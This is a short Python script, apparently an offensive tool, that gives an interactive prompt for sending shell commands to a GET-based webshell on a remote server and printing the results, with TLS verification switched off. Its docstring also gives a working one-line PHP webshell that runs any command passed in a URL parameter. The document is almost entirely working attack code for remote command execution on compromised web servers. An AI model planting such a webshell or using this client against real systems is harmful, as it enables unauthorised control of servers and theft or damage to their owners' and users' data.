#!/usr/bin/env python3
"""
A Very minimal interactive client for a GET-based webshell.

Usage:
    python3 webshell_handler_micro.py <url> <param>

Example of a basic PHP webshell:
    <?php system($_GET['cmd']); ?>

Type 'exit' to quit.
"""

import sys, requests, urllib3
urllib3.disable_warnings() # type: ignore

try:
    url, param = sys.argv[1:3]

    while True:
            cmd = input("webshell> ").strip()
            if not cmd:
                continue
            if cmd == "exit":
                break
            
            print(requests.get(url, params={param: cmd}, verify=False, timeout=20).text.strip())

except Exception as e:
    print(f"Exception: {e}")
